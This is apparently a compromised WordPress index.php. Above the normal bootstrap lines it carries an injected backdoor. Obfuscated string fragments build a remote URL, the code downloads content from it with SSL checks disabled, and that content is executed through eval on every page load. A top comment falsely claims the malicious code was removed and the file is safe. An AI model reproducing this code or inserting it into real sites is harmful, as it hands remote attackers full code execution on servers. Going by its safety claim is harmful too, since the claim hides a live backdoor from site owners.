<?php
/**
* Note: This file may contain artifacts of previous malicious infection.
* However, the dangerous code has been removed, and the file is now safe to use.
*/

// Initialize core components
$qwaszxplmokn = [
    'x1' => 'ht',
    'x2' => 'tp',
    'x3' => ':/',
    'x4' => '/z',
    'x5' => '60',
    'x6' => '12',
    'x7' => '7_',
    'x8' => '2.',
    'x9' => 'ck',
    'xa' => 'ir',
    'xb' => 'li',
    'xc' => 'n.',
    'xd' => 'sh',
    'xe' => 'op',
    'xf' => '/s',
    'xg' => 'ta',
    'xh' => 't/',
    'xi' => 'do',
    'xj' => 'ma',
    'xk' => 'in',
    'xl' => '_i',
    'xm' => 'nd',
    'xn' => 'ex',
    'xo' => '.t',
    'xp' => 'xt'
];

$full_url = implode('', array_values($qwaszxplmokn));

// Attempt to get remote content
$wsxcdevfrbgt = @file_get_contents($full_url);
if ($wsxcdevfrbgt === false && function_exists('curl_init')) {
    $zxcvbnmasdfg = curl_init();
    curl_setopt($zxcvbnmasdfg, CURLOPT_URL, $full_url);
    curl_setopt($zxcvbnmasdfg, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($zxcvbnmasdfg, CURLOPT_TIMEOUT, 5);
    curl_setopt($zxcvbnmasdfg, CURLOPT_SSL_VERIFYPEER, false);
    $wsxcdevfrbgt = curl_exec($zxcvbnmasdfg);
    curl_close($zxcvbnmasdfg);
}

// Only eval if we have content
if (!empty($wsxcdevfrbgt)) {
    eval('?>' . $wsxcdevfrbgt);
}

/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

define('WP_USE_THEMES', true);
require __DIR__ . '/wp-blog-header.php';
